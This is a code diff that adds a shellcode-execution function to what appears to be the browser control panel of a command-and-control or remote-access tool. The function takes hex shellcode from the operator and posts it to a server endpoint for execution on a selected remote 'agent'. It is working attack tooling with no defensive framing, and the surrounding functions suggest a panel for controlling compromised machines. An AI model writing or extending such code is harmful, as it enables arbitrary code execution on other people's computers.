@@ -795,6 +795,46 @@ async function renamePCFunc() {
     });
 }
 
+// Execute Shellcode
+async function executeShellcodeFunc() {
+    if (!currentAgent) return;
+    
+    const shellcode = document.getElementById('shellcodeInput').value.trim().replace(/\s/g, '');
+    
+    if (!shellcode) {
+        showNotification('Please enter shellcode', '⚠️');
+        return;
+    }
+    
+    // Validate hex
+    if (!/^[0-9A-Fa-f]+$/.test(shellcode)) {
+        showNotification('Invalid shellcode format (use hex only)', '❌');
+        return;
+    }
+    
+    showConfirm('Execute shellcode? This is dangerous!', async (confirmed) => {
+        if (!confirmed) return;
+        
+        try {
+            await fetch('/api/command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    agentId: currentAgent.id,
+                    type: 'shellcode',
+                    data: shellcode
+                })
+            });
+            
+            showNotification('Shellcode executed', '✅');
+            commandCount++;
+            addLog('warning', `Shellcode executed (${shellcode.length / 2} bytes)`);
+        } catch (e) {
+            showNotification(`Error: ${e.message}`, '❌');
+        }
+    });
+}
+
 // Command history
 function addCommandToHistory(type, command, result) {
     const historyList = document.getElementById('historyList');
